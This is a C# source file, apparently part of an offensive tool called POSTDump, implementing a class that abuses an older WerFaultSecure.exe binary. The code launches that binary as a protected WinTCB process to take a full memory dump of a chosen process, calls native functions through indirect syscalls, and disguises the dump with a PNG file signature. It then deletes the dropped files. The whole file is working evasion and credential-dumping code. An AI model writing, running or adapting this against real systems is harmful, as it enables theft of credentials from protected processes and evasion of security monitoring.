    internal class WerfaultSecure
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtResumeProcess(IntPtr ProcessHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtOpenProcess(ref IntPtr processHandle, uint desiredAccess, ref Data.OBJECT_ATTRIBUTES objectAttributes, ref Data.CLIENT_ID clientId);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateEventW(ref SECURITY_ATTRIBUTES lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);


        private static string b64_WerfaultSecure = "";

        private static bool WriteFileSig(IntPtr hFile)
        {
            Utils.NtWriteFile NTWF = (Utils.NtWriteFile)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.GetSyscallPtr("NtWriteFile"), typeof(Utils.NtWriteFile));

            byte[] sig = { 0x89, 0x50, 0x4E, 0x47 };
            IntPtr buf = Marshal.AllocHGlobal(sig.Length);
            Marshal.Copy(sig, 0, buf, sig.Length);

            Data.NTSTATUS status = NTWF(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out Data.IO_STATUS_BLOCK IoStatusBlock, buf, sig.Length, 0, 0);
            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine($"Could not write file signature, error: {status.ToString()}");
                return false;
            }

            Handle.NtClose NTC = (Handle.NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(Handle.NtClose));
            NTC(hFile);

            return true;
        }

        private static int GetMainThreadID(int pid)
        {
            IntPtr processinfotable = Handle.GetInformationTable(0x5);

            SYSTEM_PROCESS_INFORMATION processinfo = new SYSTEM_PROCESS_INFORMATION();

            IntPtr pProcessListHead = processinfotable;

            IntPtr processEntryPtr = IntPtr.Zero;

            while (true)
            {
                SYSTEM_PROCESS_INFORMATION thisProcessStruct;

                try
                {
                    thisProcessStruct = Marshal.PtrToStructure<SYSTEM_PROCESS_INFORMATION>(pProcessListHead);

                    processEntryPtr = pProcessListHead;
                }
                catch (Exception ex)
                {
                    Marshal.FreeHGlobal(processinfotable);

                    throw new Exception("Failed to marshal pointer " + ex.Message);
                }

                if ((int)thisProcessStruct.UniqueProcessId == pid)
                {
                    processinfo = thisProcessStruct;
                    break;
                }

                if (thisProcessStruct.NextEntryOffset == 0)
                    break;

                pProcessListHead = new IntPtr(pProcessListHead.ToInt64() + thisProcessStruct.NextEntryOffset);
            }

            int threadcount = (int)processinfo.NumberOfThreads;

            IntPtr threadArrayPtr = new IntPtr(processEntryPtr.ToInt64() + Marshal.SizeOf<SYSTEM_PROCESS_INFORMATION>());

            SYSTEM_THREAD_INFORMATION oldestThread = new SYSTEM_THREAD_INFORMATION();

            bool found = false;

            for (int i = 0; i < threadcount; i++)
            {
                IntPtr currentThreadPtr = new IntPtr(threadArrayPtr.ToInt64() + (Marshal.SizeOf<SYSTEM_THREAD_INFORMATION>() * i));

                SYSTEM_THREAD_INFORMATION thread = Marshal.PtrToStructure<SYSTEM_THREAD_INFORMATION>(currentThreadPtr);

                if (!found)
                {
                    oldestThread = thread;
                    found = true;
                }
                else
                {
                    if (thread.CreateTime.QuadPart < oldestThread.CreateTime.QuadPart)
                    {
                        oldestThread = thread;
                    }
                }
            }

            Marshal.FreeHGlobal(processinfotable);

            return (int)oldestThread.ClientId.UniqueThread;
        }


        private static bool ResumeProcessLoop(int pid)
        {
            NtResumeProcess NTRP = (NtResumeProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtResumeProcess"), typeof(NtResumeProcess));
            NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntopenptr, typeof(NtOpenProcess));
            Handle.NtClose NTC = (Handle.NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(Handle.NtClose));

            IntPtr hProcess = IntPtr.Zero;
            Data.OBJECT_ATTRIBUTES oa = new Data.OBJECT_ATTRIBUTES();
            Data.CLIENT_ID ci = new Data.CLIENT_ID()
            {
                UniqueProcess = (IntPtr)pid,
            };

            NTOP(ref hProcess, 0x0800, ref oa, ref ci); // 0x0800 = PROCESS_SUSPEND_RESUME
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open process with PROCESS_SUSPEND_RESUME");
                return false;
            }

            for (int i = 0; i < 10; i++)
            {
                Thread.Sleep(1000);
                Data.NTSTATUS status = NTRP(hProcess);
                if (status != 0)
                {
                    Console.WriteLine($"NtResumeProcess failed at iteration {i} with status: {status.ToString()}");
                }
                else
                {
                    Console.WriteLine($"[+] Process resumed succesfully");
                    break;
                }
            }

            NTC(hProcess);
            return true;
        }

        private static bool CreatePPLProcess(uint protectionLevel, string cmdline)
        {
            IntPtr size = IntPtr.Zero;

            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);

            IntPtr ptal = Marshal.AllocHGlobal(size);

            if (!InitializeProcThreadAttributeList(ptal, 1, 0, ref size))
            {
                Console.WriteLine($"[-] Error initializing 2nd attribute: {Marshal.GetLastWin32Error()}");
                return false;
            }

            IntPtr pProtectionLevel = Marshal.AllocHGlobal(sizeof(uint));

            Marshal.WriteInt32(pProtectionLevel, (int)protectionLevel);

            bool result = UpdateProcThreadAttribute(ptal, 0, (IntPtr)0x0002000B, pProtectionLevel, (IntPtr)sizeof(uint), IntPtr.Zero, IntPtr.Zero); // 0x0002000B - PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL

            if (!result)
            {
                Console.WriteLine($"Error setting Proc attribute: {Marshal.GetLastWin32Error()}");
                Marshal.FreeHGlobal(pProtectionLevel);
                return false;
            }


            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            STARTUPINFOEX siex = new STARTUPINFOEX();
            siex.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
            siex.lpAttributeList = ptal;
            PROCESS_INFORMATION pi;

            string commandLine = currentPath + cmdline;
            bool success = CreateProcessW(
                null,
                commandLine,
                IntPtr.Zero,
                IntPtr.Zero,
                true,
                0x00080000 | //EXTENDED_STARTUPINFO_PRESENT
                0x00040000, //CREATE_PROTECTED_PROCESS
                IntPtr.Zero,
                null,
                ref siex,
                out pi
            );


            DeleteProcThreadAttributeList(ptal);
            Marshal.FreeHGlobal(ptal);

            if (!success)
            {
                Console.WriteLine($"[-] CreateProcessW failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"[+] PPL process created with pid {pi.dwProcessId}");
            IntPtr handle = pi.hProcess;

            uint rez = WaitForSingleObject(handle, 0xFFFFFFFF);
            if (rez == 0x00000000)
            {
                Console.WriteLine($"[+] Process WerFaultSecure.exe exited");
            }

            return true;
        }


        public static bool Dump(int pid, string outfile)
        {
            byte[] WS = Convert.FromBase64String(b64_WerfaultSecure);
            IntPtr data = Marshal.AllocHGlobal(WS.Length);
            Marshal.Copy(WS, 0, data, WS.Length);
            if (Utils.WriteFile(AppDomain.CurrentDomain.BaseDirectory + "WerfaultSecure.exe", data, WS.Length))
            {
                Console.WriteLine("[+] Old binary written to disk");
            }
            else
            {
                Console.WriteLine($"[-] Fail to write binary to disk: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Handle.NtClose NTC = (Handle.NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(Handle.NtClose));

            int thread = GetMainThreadID(pid);
            if (thread == 0)
            {
                Console.WriteLine($"[-] Fail to get thread id: {Marshal.GetLastWin32Error()}");
                return false;
            }


            IntPtr hDump = Utils.CreateFile(outfile, 0, out Data.IO_STATUS_BLOCK io);
            IntPtr hEncDump = Utils.CreateFile("tmp2123.png", 0, out Data.IO_STATUS_BLOCK io2);
            if (hDump == IntPtr.Zero || hEncDump == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create dump files!");
                return false;
            }

            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.bInheritHandle = true;
            sa.nLength = Marshal.SizeOf(sa);
            sa.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hCancel = CreateEventW(ref sa, true, false, null);

            if (hCancel == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to create cancel event: {Marshal.GetLastWin32Error()}");
                NTC(hDump);
                NTC(hEncDump);
                NTC(hCancel);
                File.Delete("tmp2123.png");
                File.Delete("WerfaultSecure.exe");
                return false;
            }

            Task.Run(() => { ResumeProcessLoop(pid); });

            string cmdline = $"WerfaultSecure.exe /h /pid {pid} /tid {thread} /file {hDump.ToInt64()} /encfile {hEncDump.ToInt64()} /cancel {hCancel.ToInt64()} /type 268310"; //268310 dumpfull
            bool result = CreatePPLProcess(0x0, cmdline); //0 - WinTCB
            if (!result)
            {
                Console.WriteLine($"Failed to create process: {Marshal.GetLastWin32Error()}");
                NTC(hDump);
                NTC(hEncDump);
                NTC(hCancel);
                File.Delete("tmp2123.png");
                File.Delete("WerfaultSecure.exe");
                return false;
            }

            WriteFileSig(hDump);

            NTC(hDump);
            NTC(hEncDump);
            NTC(hCancel);

            File.Delete("tmp2123.png");
            File.Delete("WerfaultSecure.exe");

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        struct SYSTEM_PROCESS_INFORMATION
        {
            public uint NextEntryOffset;
            public uint NumberOfThreads;
            long SpareLi1;
            long SpareLi2;
            long SpareLi3;
            public long CreateTime;
            public long UserTime;
            public long KernelTime;
            public Data.UNICODE_STRING ImageName;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
            public uint HandleCount;
            public uint SessionId;
            public IntPtr PageDirectoryBase;
            public IntPtr PeakVirtualSize;
            public IntPtr VirtualSize;
            public uint PageFaultCount;
            public IntPtr PeakWorkingSetSize;
            public IntPtr WorkingSetSize;
            public IntPtr QuotaPeakPagedPoolUsage;
            public IntPtr QuotaPagedPoolUsage;
            public IntPtr QuotaPeakNonPagedPoolUsage;
            public IntPtr QuotaNonPagedPoolUsage;
            public IntPtr PagefileUsage;
            public IntPtr PeakPagefileUsage;
            public IntPtr PrivatePageCount;
            long ReadOperationCount;
            long WriteOperationCount;
            long OtherOperationCount;
            long ReadTransferCount;
            long WriteTransferCount;
            long OtherTransferCount;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct SYSTEM_THREAD_INFORMATION
        {
            public Data.LARGE_INTEGER KernelTime;
            public Data.LARGE_INTEGER UserTime;
            public Data.LARGE_INTEGER CreateTime;
            public uint WaitTime;
            public IntPtr StartAddress;
            public Data.CLIENT_ID ClientId;
            public int Priority;
            public int BasePriority;
            public uint ContextSwitchCount;
            public uint State;
            public int WaitReason;
        }
    }
